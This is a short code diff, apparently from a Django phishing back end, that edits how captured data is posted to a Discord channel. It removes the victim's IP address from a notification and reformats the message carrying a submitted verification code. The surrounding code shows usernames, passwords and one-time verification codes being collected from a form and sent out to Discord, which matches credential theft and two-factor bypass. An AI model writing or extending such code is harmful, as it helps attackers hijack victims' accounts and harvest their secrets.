@@ -235,11 +235,6 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
                     "inline": True
                 },
                 {
-                    "name": "IP Address",
-                    "value": ip_address if ip_address else "Not available",
-                    "inline": True
-                },
-                {
                     "name": "Timestamp",
                     "value": datetime.now().strftime("%Y-%m-%d %H:%M"),
                     "inline": False
@@ -403,7 +398,7 @@ def send_verification_code(request, user_id):
     if request.method == 'POST':
         verificationCodevalue = request.POST.get('verificationCodevalue')
         
-        discord_message = f"📊 **Verification Code** :  **{verificationCodevalue}**"
+        discord_message = f"📊 Verification Code :  {verificationCodevalue}"
         send_discord_message(discord_message, color=0x00ff00)
         
        
